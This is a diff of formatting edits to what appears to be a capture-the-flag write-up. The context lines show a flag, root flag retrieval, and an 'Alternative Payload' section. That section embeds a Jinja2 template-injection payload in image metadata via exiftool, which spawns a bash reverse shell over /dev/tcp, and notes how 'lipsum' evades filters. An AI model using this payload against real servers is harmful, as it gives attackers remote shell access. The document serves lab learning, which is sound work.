@@ -287,7 +287,8 @@ HSM{a3fec2e83dad}
 ✅ **Flag:** Retrieved from `/root/root.txt`
 
 ---
-**Alternative Payload**
+
+## Alternative Payload
 
 ```bash
 convert -size 1x1 xc:white /tmp/shell.png
@@ -310,7 +311,7 @@ exiftool -Artist='{{lipsum.__globals__.os.popen("bash -c \"bash -i >& /dev/tcp/1
 - Often not filtered (unlike `config`, `request`, `self`)
 - Provides access to imported modules like `os`
 
---
+---
 
 ## Key Learnings
 
